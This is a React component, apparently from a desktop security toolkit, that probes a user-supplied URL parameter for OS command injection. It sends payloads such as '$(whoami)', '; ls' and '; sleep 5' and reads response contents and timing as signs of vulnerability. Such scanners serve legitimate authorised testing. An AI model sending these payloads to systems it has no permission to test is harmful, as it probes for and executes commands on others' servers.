import { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import { InjectionIcon } from '../common/Icons';
import styles from './SharedTool.module.css';

export default function CommandInjectionTester() {
  const [url, setUrl] = useState('');
  const [parameter, setParameter] = useState('cmd');
  const [results, setResults] = useState<{ payload: string; status: string }[]>([]);
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [error, setError] = useState('');

  const payloads = [
    { payload: '; ls', desc: 'Unix command separator' },
    { payload: '`whoami`', desc: 'Backtick execution' },
    { payload: '$(whoami)', desc: 'Dollar-paren execution' },
    { payload: '| whoami', desc: 'Pipe to command' },
    { payload: '&& whoami', desc: 'AND operator' },
    { payload: '|| whoami', desc: 'OR operator' },
    { payload: '& dir', desc: 'Windows command' },
    { payload: '; sleep 5', desc: 'Time-based Linux' },
    { payload: '& timeout 5', desc: 'Time-based Windows' },
  ];

  const test = async () => {
    if (!url.trim() || !parameter.trim()) {
      setError('Please enter URL and parameter name');
      return;
    }

    setLoading(true);
    setError('');
    setResults([]);
    setProgress(0);

    const testResults: { payload: string; status: string }[] = [];

    for (let i = 0; i < payloads.length; i++) {
      const { payload } = payloads[i];
      const separator = url.includes('?') ? '&' : '?';
      const testUrl = `${url}${separator}${parameter}=${encodeURIComponent(payload)}`;
      setProgress(Math.round(((i + 1) / payloads.length) * 100));

      const startTime = Date.now();

      try {
        const response = await window.electronAPI.net.httpFetch(testUrl, { method: 'GET' });
        const responseTime = Date.now() - startTime;

        if (response.success && response.data) {
          const indicators = [
            'root:',
            'uid=',
            'gid=',
            'volume in drive',
            'directory of',
            'bin/bash',
          ];
          const found = indicators.find((ind) => response.data?.toLowerCase().includes(ind));

          if (found) {
            testResults.push({ payload, status: `VULNERABLE - Found: "${found}"` });
          } else if (payload.includes('sleep') || payload.includes('timeout')) {
            if (responseTime > 4000) {
              testResults.push({ payload, status: `VULNERABLE - Time-based (${responseTime}ms)` });
            } else {
              testResults.push({ payload, status: `No delay detected (${responseTime}ms)` });
            }
          } else {
            testResults.push({ payload, status: 'No indication' });
          }
        } else {
          testResults.push({ payload, status: `Error: ${response.error || 'Failed'}` });
        }
      } catch {
        testResults.push({ payload, status: 'Error' });
      }

      setResults([...testResults]);
      await new Promise((r) => setTimeout(r, 100));
    }

    setLoading(false);
  };

  return (
    <ToolWrapper
      title="Command Injection Tester"
      icon={<InjectionIcon />}
      description="Test for OS command injection vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            value={url}
            onChange={(e) => setUrl(e.target.value)}
            placeholder="https://example.com/api/ping"
          />
        </div>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Parameter Name</label>
          <input
            type="text"
            className={styles.input}
            value={parameter}
            onChange={(e) => setParameter(e.target.value)}
            placeholder="cmd"
          />
        </div>
        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={test} disabled={loading}>
            {loading ? `Testing... ${progress}%` : 'Test Injection'}
          </button>
          <button
            className={styles.secondaryBtn}
            onClick={() => {
              setUrl('');
              setParameter('');
              setResults([]);
              setError('');
            }}
          >
            Clear
          </button>
        </div>
      </div>

      {loading && (
        <div className={styles.resultBox}>
          <div className={styles.progressBar}>
            <div className={styles.progressFill} style={{ width: `${progress}%` }} />
          </div>
        </div>
      )}

      {error && <div className={styles.errorBox}>{error}</div>}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Results</span>
          </div>
          <table className={styles.table}>
            <thead>
              <tr>
                <th>Payload</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody>
              {results.map((r, i) => (
                <tr key={i}>
                  <td className={styles.code}>{r.payload}</td>
                  <td>
                    <span
                      className={
                        r.status.includes('VULNERABLE') ? styles.badgeError : styles.badgeSuccess
                      }
                    >
                      {r.status}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      <div className={styles.warningBox}>
        Only test on systems you own or have permission to test.
      </div>
    </ToolWrapper>
  );
}
